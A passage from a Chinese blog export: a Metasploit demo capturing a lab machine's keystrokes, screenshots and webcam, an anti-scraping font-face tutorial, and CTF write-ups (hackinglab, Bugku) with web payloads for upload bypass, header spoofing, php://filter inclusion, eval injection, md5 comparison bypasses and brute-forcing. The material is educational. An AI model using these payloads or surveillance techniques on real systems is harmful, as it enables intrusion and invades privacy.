<p>我们来测试几个好玩的<br><strong><em>1st.捕捉靶机键盘记录</em></strong><br><img src="https://s2.ax1x.com/2019/03/30/ABcO76.png" alt="捕捉到靶机键盘记录（hack hack）"><br><strong><em>2nd.捕捉靶机截屏</em></strong><br><img src="https://s2.ax1x.com/2019/03/30/ABgkHP.png" alt="捕捉靶机截屏"><br><img src="https://s2.ax1x.com/2019/03/30/ABg9cd.md.jpg" alt="捕捉靶机截屏"><br><strong><em>3rd.用靶机摄像头拍照</em></strong><br><img src="https://s2.ax1x.com/2019/03/30/ABg8EV.png" alt="利用靶机摄像头拍照"><br><img src="https://s2.ax1x.com/2019/03/30/ABgn3Q.jpg" alt="靶机摄像头像素略渣，不过看看我们的公教区学习环境吧"></p>
<h2 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h2><p><strong>我们做攻击实验都是在环境都配置好的情况下，现实生活中不会有这么好的肉鸡。而且网络攻击属于违法行为，人生路漫漫，且行且珍惜hhhhh</strong></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title>反爬虫策略之font-face</title>
    <url>/2020/03/02/%E5%8F%8D%E7%88%AC%E8%99%AB%E7%AD%96%E7%95%A5%E4%B9%8Bfont-face/</url>
    <content><![CDATA[<p><strong>在互联网快速发展的时代里，爬虫可以说是无处不在。各类热搜以及热点新闻，时时刻刻都在被爬虫获取。如果开发者并不想让内容大范围传播呢？如何应对爬虫呢？常见的方法有验证码验证，以及对频繁登陆ip进行屏蔽，除此之外，还有一种通过font-face自定义字体的方式，可以让爬取到的内容和网页显示的内容完全不一样，从而产生一种是否爬错内容了的感觉。</strong></p>
<a id="more"></a>
<h2 id="1-font-face介绍："><a href="#1-font-face介绍：" class="headerlink" title="1.font-face介绍："></a>1.font-face介绍：</h2><p>谈到font-face，也许很多人并不熟悉，但是说到应用此技术的公司，大家肯定都很熟悉了，58同城，猫眼电影等，都采用了font-face策略来应对爬虫。以<a href="https://su.58.com/zufang/pn2/?PGTID=0d300008-0000-5965-8ce1-1873463f7758&ClickID=1">58同城</a>为例，打开审查元素，发现页面内的3室2厅1卫 和120㎡中的数字均变成了乱码 —-“驋室麣厅龒卫”,”龒麣龤㎡”。所以即便爬虫找到了正确位置，也依然无法获得正确信息。<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA1LzA3L1llWkV3Ui5wbmc?x-oss-process=image/format,png" alt="58同城页面信息"></p>
<h2 id="2-font-face原理："><a href="#2-font-face原理：" class="headerlink" title="2.font-face原理："></a>2.font-face原理：</h2><p>仔细观察审查元素信息，在styles栏里发现了font-family，这就是自定义字体，可以把乱码显示成正常的数字。<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA1LzA3L1llbVl6OC5wbmc?x-oss-process=image/format,png" alt="审查元素"><br>于是我们要找到font-family字样，右键点击网页源代码，搜索font-family，找到@font-face等关键字，通过分析data:application/font-ttf，可以猜测后面长串字符串应该是对某个ttf字体进行了base64编码。<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA1LzA3L1lld0Z3bi5wbmc?x-oss-process=image/format,png" alt="查看网页源代码"><br>上python，解码生成ttf字体文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from fontTools.ttLib import TTFont</span><br><span class="line">import base64</span><br><span class="line">import io</span><br><span class="line"></span><br><span class="line">key&#x3D;&#39;&#39;&#39;</span><br><span class="line">AAEAAAALAIAAAwAwR1NVQiCLJXoAAAE.......AAAA    #key值为源代码中的长串字符串</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">data &#x3D; base64.b64decode(key) #base64解码</span><br><span class="line">fonts &#x3D; TTFont(io.BytesIO(data)) #生成二进制字节</span><br><span class="line">fonts.save(&#39;font-face.ttf&#39;)</span><br></pre></td></tr></table></figure>
<p>将生成的font-face.ttf通过<a href="http://fontstore.baidu.com/static/editor/index.html">百度字体编辑器</a>打开，可以看到对所有数字进行了重新编码。<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA1LzA3L1llRHJrUi5wbmc?x-oss-process=image/format,png" alt="自定义字体"><br>是不是有点儿疑惑？怎么对数字重新编码？？？其实也可以理解为是对编码对应的图形进行了改变，比如同样是编码(0x9a4b)，在常规字体中是”驋”的模样可能在B字体中就是”2”的模样，在自己设计的字体里，可以任性的把(0x9a4b)编码对应的图形设计成”2”的形状，举个例子:<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA1LzA3L1llUmxpNC5qcGc?x-oss-process=image/format,png" alt="自定义字体有不一样的形状"><br>同样是(0x9a4b)编码，在字体A中，你认为是2，在字体B中，即便和字体A中形状不一样，你一样认为是2，但在自定义字体中，你会认为是w。同样的道理，我们可以把常规字体中的乱码，设计成数字的形状。<br>所以在自定义字体的基础上，我们可以变相认为对字体进行了加密，从而起到保护重要数据的作用。</p>
<h2 id="3-实现font-face："><a href="#3-实现font-face：" class="headerlink" title="3.实现font-face："></a>3.实现font-face：</h2><p>理解了font-face的原理后，我们可以将font-face策略应用到自己的web项目中。为了简便操作，我直接用了第二步中在58同城网站下载的字体hhh(自行设计字体也很cool，想怎么画怎么画)。在前端html文件中加入以下内容:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">@font-face&#123;font-family:&#39;secret&#39;;src:url(&#39;data:application&#x2F;font-ttf;</span><br><span class="line">charset&#x3D;utf-8;base64,AAEAAAALAIAAAwAwR1NVQiCLJXoA.......AAAAAAAAA&#39;)</span><br><span class="line">format(&#39;truetype&#39;)&#125;.strongbox&#123;font-family:&#39;fangchan-secret&#39;,&#39;Hiragino Sans GB&#39;,</span><br><span class="line">&#39;Microsoft yahei&#39;,Arial,sans-serif,&#39;宋体&#39;!important&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">.font&#123;font-family:&#39;secret&#39;,&#39;Hiragino Sans GB&#39;,&#39;Microsoft yahei&#39;,Arial,sans-serif,&#39;\5B8B\4F53&#39; !important&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>
<p>上面一段的作用为引入名叫”secret”的自定义字体,然后通过style设计.font，使所有class为”font”的标签应用此自定义字体。换言之，当你想用自定义字体时，在相应的标签中加入class=”font”，如下html源码和前端显示结果:<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA1LzA3L1llb3Q5VS5wbmc?x-oss-process=image/format,png" alt="html源码"><br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA1LzA3L1llb0poVC5wbmc?x-oss-process=image/format,png" alt="前端显示结果"><br>可见2020 04-27日期字样在源码中显示为乱码。<br><a href="http://wxt123.top/news">访问上图中我的web项目，点击链接即可，</a>(暂时只对页面右侧一栏中的日期做了font-face加密。)</p>
<h4 id="如有错误或建议，请在评论处指出！"><a href="#如有错误或建议，请在评论处指出！" class="headerlink" title="如有错误或建议，请在评论处指出！"></a>如有错误或建议，请在评论处指出！</h4>]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>font-face</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全实验室--上传关</title>
    <url>/2019/02/20/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%AE%A4--%E4%B8%8A%E4%BC%A0%E5%85%B3/</url>
    <content><![CDATA[<p><a href="http://hackinglab.cn/index.php">基础关题目地址</a><br><strong>网络安全实验室之上传关，题目略少，也很基础，如有错误，欢迎在评论中指出。</strong></p>
<a id="more"></a>
<h2 id="1-请上传一张jpg格式的图片"><a href="#1-请上传一张jpg格式的图片" class="headerlink" title="1.请上传一张jpg格式的图片"></a>1.请上传一张jpg格式的图片</h2><p><strong>只能上传jpg格式的图片哦～！</strong><br><a href="http://lab1.xseclab.com/upload1_a4daf6890f1166fd88f386f098b182af/">（过关地址）</a><br>解：上传一张jpg图片，被嘲讽了没有得到flag，想到实际应上传php文件，应该想到上传jpg文件然后修改请求报文里的相关内容，先bp抓包，发送到repeater，修改filename后的后缀名，将jpg改为php，点击go，得到flag。<br>ps:还有一种方法，通过查看页面源代码，发现是前端JS控制的，直接利用NoScript插件禁用JS功能，然后上传php文件，得到flag。<br><img src="https://s2.ax1x.com/2019/02/20/k2h8MQ.png" alt="修改filename后缀"><br><em>key is IKHJL9786#$%^&amp;</em></p>
<h2 id="2-请上传一张jpg格式的图片"><a href="#2-请上传一张jpg格式的图片" class="headerlink" title="2.请上传一张jpg格式的图片"></a>2.请上传一张jpg格式的图片</h2><p><strong>只能是jpg哦！</strong><br><a href="http://lab1.xseclab.com/upload2_31cc2e024f91058a742d8bed95c7ca4f/">（过关地址）</a><br>解：上传一张jpg文件，提示信息和上道题类似，解决方法也相同，先上传一张jpg文件然后bp抓包发送到repeater，修改filename里的后缀，将jpg改为php，得到flag。<br><em>key is 76tyuhjsdvytig#$%^&amp;</em></p>
<h2 id="3-请上传一张jpg格式的图片"><a href="#3-请上传一张jpg格式的图片" class="headerlink" title="3.请上传一张jpg格式的图片"></a>3.请上传一张jpg格式的图片</h2><p><strong>只能是jpg哦！</strong><br><a href="http://lab1.xseclab.com/upload3_67275a14c1f2dbe0addedfd75e2da8c1/">（过关地址）</a><br>解：上传一张jpg文件，依然是相似提示，但是按照前两题的解题做法依然得不到flag，查看页面源代码，发现要求文件名第一个”.”后面为jpg就可以，试一下更改filename的后缀名，将jpg改称jpg.php，得到flag。<br><img src="https://s2.ax1x.com/2019/02/20/kRidBj.png" alt="页面源代码"><br><img src="https://s2.ax1x.com/2019/02/20/kRCxLd.png" alt="修改filename后缀"><br><em>key is jkljdkl232jkljkdl2389</em></p>
<p><strong>欢迎一起讨论！</strong></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全实验室--基础关</title>
    <url>/2019/02/14/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%AE%A4--%E5%9F%BA%E7%A1%80%E5%85%B3/</url>
    <content><![CDATA[<p><a href="http://hackinglab.cn/index.php">基础关题目地址</a><br><strong>刚入web坑，菜鸟一枚，如有错误，欢迎在评论中指出。</strong></p>
<a id="more"></a>
<h2 id="1-key在哪里？"><a href="#1-key在哪里？" class="headerlink" title="1.key在哪里？"></a>1.key在哪里？</h2><p><a href="http://lab1.xseclab.com/base1_4a4d993ed7bd7d467b27af52d2aaa800/index.php">（过关地址）</a><br>解：右击查看网页源代码，得到flag。<br><em>key is jflsjklejflkdsjfklds</em></p>
<h2 id="2-再加密一次你就得到key啦"><a href="#2-再加密一次你就得到key啦" class="headerlink" title="2.再加密一次你就得到key啦~"></a>2.再加密一次你就得到key啦~</h2><p><strong>加密之后的数据为xrlvf23xfqwsxsqf</strong><br>解：根据提示再加密一次得到key，这是rot13加密的特点，我们再用rot13加密一次，得到flag。<br><em>keyis23ksdjfkfds</em></p>
<h2 id="3-猜猜这是经过了多少次加密？"><a href="#3-猜猜这是经过了多少次加密？" class="headerlink" title="3.猜猜这是经过了多少次加密？"></a>3.猜猜这是经过了多少次加密？</h2><p><strong>加密后的字符串为：</strong><code>Vm0wd2QyUXlVWGxWV0d4V1YwZDRWAxV2JETlhh……（中间省略n行）UVkVXbFphVjFJeFNsVmlSa1pXVmtSQk5RPT0=</code><br>解：根据加密结果的最后是“=”，这是base64加密的标志，我们通过base64不断解密20次，得到flag。<br><em>key is jkljdkl232jkljkdl2389</em></p>
<h2 id="4-据说MD5加密很安全，真的是么？"><a href="#4-据说MD5加密很安全，真的是么？" class="headerlink" title="4.据说MD5加密很安全，真的是么？"></a>4.据说MD5加密很安全，真的是么？</h2><p><strong>密文：e0960851294d7b2253978ba858e24633</strong><br>解：直接将密文通过md5在线解密，得到flag。<br><em>bighp</em></p>
<h2 id="5-种族歧视"><a href="#5-种族歧视" class="headerlink" title="5.种族歧视"></a>5.种族歧视</h2><p><strong>小明同学今天访问了一个网站，竟然不允许中国人访问！太坑了，于是小明同学决心一定要进去一探究竟！</strong><br><a href="http://lab1.xseclab.com/base1_0ef337f3afbe42d5619d7a36c19c20ab/index.php">过关地址</a><br>解：访问页面显示only for Foreigner，bp抓包看看，把抓到的包发送到repeater，根据提示把accept-language后的中文支持删掉，果然得到flag。<br><img src="https://s2.ax1x.com/2019/02/14/kBwcIU.png" alt="修改accept-language，得到flag"><br><em>key is: <em>(TU687jksf6&amp;</em></em></p>
<h2 id="6-HAHA浏览器"><a href="#6-HAHA浏览器" class="headerlink" title="6.HAHA浏览器"></a>6.HAHA浏览器</h2><p><strong>据说信息安全小组最近出了一款新的浏览器，叫HAHA浏览器，有些题目必须通过HAHA浏览器才能答对。小明同学坚决不要装HAHA浏览器，怕有后门，但是如何才能过这个需要安装HAHA浏览器才能过的题目呢？</strong><br><a href="http://lab1.xseclab.com/base6_6082c908819e105c378eb93b6631c4d3/index.php">过关地址</a><br>解：访问网页提示要安装HAHA浏览器，想到修改user-agent，bp抓包，将包发送到repeater，将user-agent后的浏览器名称改为HAHA，得到flag。<br><img src="https://s2.ax1x.com/2019/02/14/kBB8N8.png" alt="修改user-agent"><br><em>key is: meiyouHAHAliulanqi</em></p>
<h2 id="7-key究竟在哪里呢？"><a href="#7-key究竟在哪里呢？" class="headerlink" title="7.key究竟在哪里呢？"></a>7.key究竟在哪里呢？</h2><p><strong>上一次小明同学轻松找到了key，感觉这么简单的题目多无聊，于是有了找key的加强版，那么key这次会藏在哪里呢？</strong><br><a href="http://lab1.xseclab.com/base7_eb68bd2f0d762faf70c89799b3c1cc52/index.php">过关地址</a><br>解：访问页面没有得到想要的信息，bp抓包，在response栏里得到flag。<br><img src="https://s2.ax1x.com/2019/02/14/kBB7CD.png" alt="发现key"><br><em>Key: kjh%#$#%FDjjj</em></p>
<h2 id="8-key又找不到了"><a href="#8-key又找不到了" class="headerlink" title="8.key又找不到了"></a>8.key又找不到了</h2><p><strong>小明这次可真找不到key去哪里了，你能帮他找到key吗？</strong><br><a href="http://lab1.xseclab.com/base8_0abd63aa54bef0464289d6a42465f354/index.php">过关地址</a><br>解：访问页面无有用信息，bp抓包，在一个页面的response栏里发现有用信息。<br><img src="https://s2.ax1x.com/2019/02/14/kBDeaV.png" alt="发现绿色的提示信息"><br>根据提示访问<a href="http://hacklist.sinaapp.com/base8_0abd63aa54bef0464289d6a42465f354/key_is_here_now_.php">./key_is_here_now_.php</a>页面，得到flag。<br><em>key: ohHTTP302dd</em></p>
<h2 id="9-冒充登陆用户"><a href="#9-冒充登陆用户" class="headerlink" title="9.冒充登陆用户"></a>9.冒充登陆用户</h2><p><strong>小明来到一个网站，还是想要key，但是却怎么逗登陆不了，你能帮他登陆吗？</strong><br><a href="http://lab1.xseclab.com/base9_ab629d778e3a29540dfd60f2e548a5eb/index.php">过关地址</a><br>解：根据提示应想到修改与登陆有关的值，bp抓包，发送到repeater，将Cookie的Login设为1得到key。<br><img src="https://s2.ax1x.com/2019/02/14/kBr4fO.png" alt="修改Cookie的Login值"><br><em>key is: yescookieedit7823789KJ</em></p>
<h2 id="10-比较数字大小"><a href="#10-比较数字大小" class="headerlink" title="10.比较数字大小"></a>10.比较数字大小</h2><p><strong>只要比服务器上的数字大就可以了！</strong><br><a href="http://lab1.xseclab.com/base10_0b4e4866096913ac9c3a2272dde27215/index.php">过关地址</a><br>解：访问页面，尝试输入，发现只能输入3位数，打开web控制台，点击HackBar插件（需要先在FireFox浏览器上下载该插件），先点击Load URL，再勾选Post data，然后修改v=10000，点击Execute，得到flag。<br><img src="https://s2.ax1x.com/2019/02/14/kByqFP.png" alt="post传参"><br><em>key is 768HKyu678567&amp;\</em>&amp;K*</p>
<h2 id="11-本地的诱惑"><a href="#11-本地的诱惑" class="headerlink" title="11.本地的诱惑"></a>11.本地的诱惑</h2><p><strong>小明扫描了他心爱的小红的电脑，发现开放了一个80端口，但是当小明去访问的时候却发现只允许从本地访问，可他心爱的小红不敢让这个诡异的小明触碰她的电脑，可小明真的想知道小红电脑的80端口到底隐藏着什么秘密(key)？</strong><br><a href="http://lab1.xseclab.com/base11_0f8e35973f552d69a02047694c27a8c9/index.php">过关地址</a><br>解：根据提示应想到修改ip地址为本地，想到X-Forwarded-For，bp抓包，发送到repeater，添加X-Forwarded-For：127.0.0.1，得到flag。<br><img src="https://s2.ax1x.com/2019/02/14/kBcUvF.png" alt="添加X-Forwarded-For"><br><em>key is ^&amp;</em>(UIHKJjkadshf*</p>
<h2 id="12-就不让你访问"><a href="#12-就不让你访问" class="headerlink" title="12.就不让你访问"></a>12.就不让你访问</h2><p><strong>小明设计了一个网站，因为总是遭受黑客攻击后台，所以这次他把后台放到了一个无论是什么人都找不到的地方….可最后还是被黑客找到了，并被放置了一个黑页，写到:find you ,no more than 3 secs!</strong><br><a href="http://lab1.xseclab.com/base12_44f0d8a96eed21afdc4823a0bf1a316b/index.php">过关地址</a><br>解：访问页面，提示key在admin页面，访问admin.php，是个错误页面，bp抓包，没抓到有用信息，试一下后台扫描（我用的是工具是御剑后台扫面），发现robots.txt。<br><img src="https://s2.ax1x.com/2019/02/14/kBgxyD.png" alt="后台扫描"><br>打开发现有用信息（Disallow: /9fb97531fe95594603aff7e794ab2f5f/），Disallow为不让搜索引擎收录，所以扫描工具没有扫描到，但用户可以访问，打开<a href="http://lab1.xseclab.com/base12_44f0d8a96eed21afdc4823a0bf1a316b/9fb97531fe95594603aff7e794ab2f5f/">http://lab1.xseclab.com/base12_44f0d8a96eed21afdc4823a0bf1a316b/9fb97531fe95594603aff7e794ab2f5f/</a>，提示在login page，访问./login.php，得到flag。<br><em>key is UIJ%%IOOqweqwsdf</em></p>
<p><strong>欢迎一起讨论！</strong></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku Web总结(持续更新ing)</title>
    <url>/2021/01/22/Bugku%20Web%E6%80%BB%E7%BB%93(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0ing)/</url>
    <content><![CDATA[<p>Bugku对于入门CTF的小白还是挺适合的，新版的Bugku和旧版有些不同，而且此前也没有整理过ctf web的骚操作，正好借这个机会补一补，总结新版Bugku Web中典型题目的wp，和一些常用函数的介绍，以及基础绕过姿势的总结。</p>
<p>ps：题目环境的flag可能随机生成，所以每道题的flag不一定固定！</p>
<a id="more"></a>
<hr>
<h2 id="Web-5"><a href="#Web-5" class="headerlink" title="Web 5"></a>Web 5</h2><p><strong>tip: 矛盾</strong></p>
<p>题目要求GET参数num要满足两个条件：</p>
<ul>
<li>!is_numeric($num)</li>
<li>$num==1</li>
</ul>
<p>即num不是数字，且num要等于1；利用php中弱相等符号(==)的特性，构造num=1a来绕过，轻松得到flag{d25c3c84d25fbc1e5d6b14ac16d2c941}</p>
<hr>
<h2 id="Web-8"><a href="#Web-8" class="headerlink" title="Web 8"></a>Web 8</h2><p><strong>tip: 文件包含</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    include &quot;flag.php&quot;;</span><br><span class="line">    $a &#x3D; @$_REQUEST[&#39;hello&#39;];</span><br><span class="line">    eval( &quot;var_dump($a);&quot;);</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>由源码可知要对输入的参数进行var_dump操作，利用file函数构造payload，file()函数用于读取文件内容，将整个文件读入数组中。payload为?hello=file(‘flag.php’)，轻松得到flag{82450de31e54c7263e735f2be3619c66}</p>
<hr>
<h2 id="Web-9"><a href="#Web-9" class="headerlink" title="Web 9"></a>Web 9</h2><p><strong>tip: flag In the variable !</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#39;args&#39;]))&#123;</span><br><span class="line">    $args &#x3D; $_GET[&#39;args&#39;];</span><br><span class="line">    if(!preg_match(&quot;&#x2F;^\w+$&#x2F;&quot;,$args))&#123;</span><br><span class="line">        die(&quot;args error!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    eval(&quot;var_dump($$args);&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>$args需要满足正则匹配/^\w+$/，然后执行var_dump操作，注意到var_dump中$args前还有一个$符号，根据提示猜测flag藏在全局变量GLOBALS中，构造payload为?args=GLOBALS，轻松得到flag{4ffb43bb1468970faace8bdbb0c5c59e}</p>
<p>ps:</p>
<ul>
<li>对于/^\w+$/i，两端/ /表示开始和结束；^表示开始字符串；$表示结束字符串；\w表示包含[a-z，A-Z, _ , 0-9]；+表示一个或者多个\w；后面的i表示不区分大小写；</li>
<li>在PHP中$GLOBALS的作用是：引用全局作用域中可用的全部变量;</li>
</ul>
<hr>
<h2 id="Web-11"><a href="#Web-11" class="headerlink" title="Web 11"></a>Web 11</h2><p><strong>tip: 网站被黑了 黑客会不会留下后门</strong></p>
<p>利用dirmap或其他工具扫描站点，找到shell.php页面，需要密码登录，利用密码字典和burpsuite进行爆破攻击，得到flag{d6ca23ac2b9ab6fd2f54c639ff5b4eb6}</p>
<hr>
<h2 id="社工-伪造"><a href="#社工-伪造" class="headerlink" title="社工-伪造"></a>社工-伪造</h2><p><strong>tip: 伪造信息</strong></p>
<p>随便登录一个账号进去，在和小美的聊天窗输入flag，提示 “我只告诉我的男朋友，他说除了他谁能不能说哦。”，然后查看小美的空间，发现了小美的男朋友备注是 “小bug” 。</p>
<p>OK了，可以开始伪造了，将自己的qq号昵称改为 “小bug” ，然后用昵称为 “小bug” 的账号登录，在聊天窗输入flag，就可以得到flag{9b6463a15d77d778e0bcab037b7b2e83}</p>
<hr>
<h2 id="Web-14"><a href="#Web-14" class="headerlink" title="Web 14"></a>Web 14</h2><p><strong>tip: flag在index里</strong></p>
<p>进入题目点击链接(click me? no)，点击后注意到url变化为index.php?file=show.php，典型的文件包含，利用filter伪协议构造payload为?file=php://filter/read=convert.base64-encode/resource=index.php，读取后进行base64解码得到flag{89382da3663b64c9adfbd35a90c31981}</p>
<hr>
<h2 id="Web-16"><a href="#Web-16" class="headerlink" title="Web 16"></a>Web 16</h2><p><strong>tip: 备份是个好东西</strong></p>
<p>根据提示备份直接下载index.php.bak文件，然后审计源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$str &#x3D; strstr($_SERVER[&#39;REQUEST_URI&#39;], &#39;?&#39;);</span><br><span class="line">$str &#x3D; substr($str,1);</span><br><span class="line">$str &#x3D; str_replace(&#39;key&#39;,&#39;&#39;,$str);</span><br><span class="line">parse_str($str);</span><br><span class="line">echo md5($key1);</span><br><span class="line"></span><br><span class="line">echo md5($key2);</span><br><span class="line">if(md5($key1) &#x3D;&#x3D; md5($key2) &amp;&amp; $key1 !&#x3D;&#x3D; $key2)&#123;</span><br><span class="line">    echo $flag.&quot;取得flag&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据源码可知对key字符串进行了过滤，可用kkeyey绕过；同时要求解析后的key1和key2值不同，但是md5相同。md5的绕过方法有很多种，这里介绍三种方法，一个是0e绕过弱相等，一个是利用数组绕过，还有一个md5碰撞，利用fastcoll生成两组md5相同的字符串；</p>
<ul>
<li>法一：利用md5的弱相等性，在弱比较里，0e开头的会被识别成科学计数法，结果均为0，可构造两个字符串的md5值都以0e开头，payload为?kkeyey1=QNKCDZO&amp;kkeyey2=s878926199a，即可得到flag{738457a5de32daabfaa435caea830c75}</li>
<li>法二：md5无法处理数组，当遇到数组时会返回NULL，因此可以利用数组绕过(数组绕过可以绕过强判断===)</li>
<li>法三：md5碰撞，利用fastcoll生成两段md5相等的文本(fastcoll.exe -p source.txt -o 1.txt 2.txt)，因为有乱码所以将这些字符串进行url编码处理，可以构造payload,kkeyey1和kkeyey2的值分别为：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kkeyey1&#x3D;123%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%003%9F%05%08%F2%7C%D5N%A9%C8%D1o%ACD%0C%1Cy%C2-%B6%1F%2F%D8%8C%24%CA%7F%AEo%2A%93%E0j%E3%FF%C7%82%C4%9D%AB%CBm%3B%9C%A4A%80zu%B2%C1qf%00%F6%97J%D2%A7%40%7D%9F%5C2%CA%DA%0DC%0B%A1r%EC_%D826%E7%EC%1C%E9%C1%5E9Z%22%88%FF%8A%7C%D9%F3W%5B%10%CD%C1%9D%B9%B0.%04%92%83%B6%AA%9A%E7%B8b%B0%5EG%A8%CD%8Bm%9E%A2%EB%3B%A8%E4%86CO%C4+%93</span><br><span class="line"></span><br><span class="line">kkeyey2&#x3D;123%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%003%9F%05%08%F2%7C%D5N%A9%C8%D1o%ACD%0C%1Cy%C2-6%1F%2F%D8%8C%24%CA%7F%AEo%2A%93%E0j%E3%FF%C7%82%C4%9D%AB%CBm%3B%9C%A4%C1%80zu%B2%C1qf%00%F6%97J%D2%A7%C0%7D%9F%5C2%CA%DA%0DC%0B%A1r%EC_%D826%E7%EC%1C%E9%C1%5E9%DA%22%88%FF%8A%7C%D9%F3W%5B%10%CD%C1%9D%B9%B0.%04%92%83%B6%AA%9A%E7%B8b0%5EG%A8%CD%8Bm%9E%A2%EB%3B%A8%E4%86%C3O%C4+%93</span><br></pre></td></tr></table></figure>
通过三种方法的payload都可得到flag{738457a5de32daabfaa435caea830c75}</li>
</ul>
<p>ps:总结几个常见的php函数，strstr()，substr()和parse_str()</p>
<ul>
<li>strstr(string,a,b)：其中string和a是必填，b为选填，作用为判度string中是否存在a，若存在返回a以及a后的全部字符，如strstr(“Hello world!”,”wo”)的输出为world! ;</li>
<li>substr(string,start,length):其中string和start为必填，length为选填，函数返回值为string字符串从第start个字符起，往后length个字符，如substr(“Hello world”,1)的输出为ello world ;</li>
<li>parse_str(string,array)：其中string为必填，array为选填，函数作用为把查询字符串解析到变量中。如parse_str(“name=Bill&amp;age=60”)作用是解析生成了两个变量$name=Bill和$age=60 ；</li>
</ul>
<hr>
<h2 id="Web-20"><a href="#Web-20" class="headerlink" title="Web 20"></a>Web 20</h2><p><strong>tip: cookies欺骗</strong></p>
<p>Bugku中有好几道脚本题，选择了这一道写个wp。进入页面后在url处发现疑点，filename为base64编码后的文件名，line为所在行数，作用为读取文件的第line行显示到页面中。于是乎，写个脚本读取index.php的所有行数，脚本如下所示；</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">for i in range(50):</span><br><span class="line">    url&#x3D;f&quot;http:&#x2F;&#x2F;114.67.246.176:10508&#x2F;index.php?line&#x3D;&#123;str(i)&#125;&amp;filename&#x3D;aW5kZXgucGhw&quot; </span><br><span class="line">    s&#x3D;requests.get(url)</span><br><span class="line">    print(s.text)</span><br></pre></td></tr></table></figure>
<p>通过上面的脚本得到index.php的源码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$file&#x3D;base64_decode(isset($_GET[&#39;filename&#39;])?$_GET[&#39;filename&#39;]:&quot;&quot;);</span><br><span class="line">$line&#x3D;isset($_GET[&#39;line&#39;])?intval($_GET[&#39;line&#39;]):0;</span><br><span class="line">if($file&#x3D;&#x3D;&#39;&#39;) header(&quot;location:index.php?line&#x3D;&amp;filename&#x3D;a2V5cy50eHQ&#x3D;&quot;);</span><br><span class="line">$file_list &#x3D; array(</span><br><span class="line">&#39;0&#39; &#x3D;&gt;&#39;keys.txt&#39;,</span><br><span class="line">&#39;1&#39; &#x3D;&gt;&#39;index.php&#39;,</span><br><span class="line">);</span><br><span class="line">if(isset($_COOKIE[&#39;margin&#39;]) &amp;&amp; $_COOKIE[&#39;margin&#39;]&#x3D;&#x3D;&#39;margin&#39;)&#123;</span><br><span class="line">$file_list[2]&#x3D;&#39;keys.php&#39;;</span><br><span class="line">&#125;</span><br><span class="line">if(in_array($file, $file_list))&#123;</span><br><span class="line">$fa &#x3D; file($file);</span><br><span class="line">echo $fa[$line];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>审计源码发现需要设置cookie值margin=margin，将keys.php导入file_list数组中，然后通过filename和line来读取keys.php的内容，keys.php的base64编码为a2V5cy5waHA=，从而构造payload为?line=&amp;filename=a2V5cy5waHA=,并利用burpsuite修改cookie值为margin=margin后，得到flag{47a96001690bf176b7c935eb14c418cf}</p>
<p>ps:总结一个intval()函数，返回值为获取变量的整数值</p>
<hr>
<h2 id="Web-21"><a href="#Web-21" class="headerlink" title="Web 21"></a>Web 21</h2><p><strong>tip: never never never give up!!!</strong></p>
<p>查看页面源代码，提示1p.html，访问1p.html直接跳转到bugku官方url，通过burpsuite拦截1p.html的返回内容，发现base64编码字符串，进行base64解码，再进行url解码，得到源码，进行审计：</p>
